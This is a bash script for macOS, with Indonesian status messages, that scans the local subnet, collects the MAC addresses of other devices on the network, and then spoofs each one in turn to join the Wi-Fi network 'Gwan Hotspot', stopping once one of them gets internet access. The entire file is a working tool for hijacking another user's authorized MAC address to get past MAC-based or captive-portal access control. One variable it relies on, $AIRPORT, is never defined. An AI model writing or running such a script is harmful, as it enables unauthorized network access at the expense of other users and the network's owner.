#!/bin/bash
INTERFACE="en0"
SSID="Gwan Hotspot"

echo "[*] Mencari Mac address..."

MY_IP=$(ipconfig getifaddr $INTERFACE)
ROUTER_IP=$(netstat -rn -f inet | grep 'default' | awk '{print $2}' | head -n 1)

ROUTER_MAC=$(arp -a -i $INTERFACE | grep "($ROUTER_IP)" | awk '{print $4}')


SUBNET=$(echo $MY_IP | cut -d. -f1-3)
for i in {1..254}; do
  ping -c 1 -W 150 $SUBNET.$i > /dev/null 2>&1 &
done
wait

MACS=($(arp -a -i $INTERFACE | grep -v "incomplete" | awk -v router_ip="$ROUTER_IP" -v router_mac="$ROUTER_MAC" -v myip="$MY_IP" -F '[()]' '{
  ip = $2
  split($3, a, " ")
  mac = a[2]

  split(mac, octets, ":")
  formatted_mac = ""
  for (i = 1; i <= length(octets); i++) {
    if (length(octets[i]) == 1) octets[i] = "0" octets[i]
    formatted_mac = (i == 1) ? octets[i] : formatted_mac ":" octets[i]
  }

  if (ip != router_ip && ip != myip && ip !~ /^224\./ && formatted_mac != router_mac && formatted_mac != "ff:ff:ff:ff:ff:ff") {
    print formatted_mac
  }
}' | sort -u))

echo "------------------ LIST ----------------------"

for i in "${!MACS[@]}"; do
    echo "${MACS[$i]}"
done

echo "----------------------------------------"

echo "[*] Memulai rotasi MAC Address di macOS..."

for mac in "${MACS[@]}"; do
  echo "----------------------------------------"
  echo "[*] Mencoba MAC: $mac"

  # 1. Putuskan Wi-Fi sementara
  sudo "$AIRPORT" -z 2>/dev/null
  sleep 1

  sudo ifconfig $INTERFACE ether $mac

  echo "[*] Menghubungkan ke SSID: $SSID..."
  networksetup -setairportnetwork $INTERFACE "$SSID"
  
  echo "[*] Menunggu alokasi IP..."
  sleep 8

  # 4. Tes koneksi internet
  if curl -s --max-time 5 http://google.com > /dev/null; then
    echo "[+] Berhasil konek menggunakan MAC: $mac"
    exit 0
  fi

  echo "[-] Gagal konek dengan MAC: $mac"
  sleep 2
done

echo "----------------------------------------"
echo "[-] Semua MAC Address gagal diproses."
